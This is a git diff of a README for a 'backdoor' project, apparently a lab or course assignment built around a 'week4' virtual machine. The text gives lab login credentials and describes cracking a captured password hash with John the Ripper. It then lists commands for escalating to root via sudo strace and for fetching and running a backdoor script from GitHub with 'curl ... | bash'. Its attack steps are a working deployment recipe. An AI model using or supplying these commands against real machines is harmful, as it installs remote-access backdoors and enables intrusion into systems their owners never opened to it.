@@ -1,6 +1,6 @@
 # Project
 
-File Overview
+Project File Overview<br>
 Bash Scripts (Deployed on Target):
 
 - backdoor: Deployment script
@@ -31,9 +31,9 @@ Guest Port: 4444<br>
 
 ___________________________________
 
-ssh into the week4 virtual machine
-User: user
-Password: hill
+ssh into the week4 virtual machine<br>
+User: user<br>
+Password: hill<br>
 
 Note: (I analyzed the .pcapng file in Wireshark and identified an HTTP response containing user data. A hashed password for the user user stood out. Using John the Ripper with the rockyou.txt wordlist, I successfully cracked the hash and retrieved the password: hill.)
 
@@ -42,14 +42,14 @@ ___________________________________
 
 To escalate privileges use this command:
 
-Command:sudo strace -o /dev/null /bin/bash
-Command: cd (Change Directory)
-Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash
+Command:sudo strace -o /dev/null /bin/bash<br>
+Command: cd (Change Directory)<br>
+Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash<br>
 
 ___________________________________
 
 
-Once this done, Clone the reopsitory in your system and navigate from terminal to Python folder directory and run 
+Once this done, Clone the reopsitory in your system and navigate from terminal to Python folder directory and run <br>
 `python sys.py`
 
 B) how your backdoor works internally
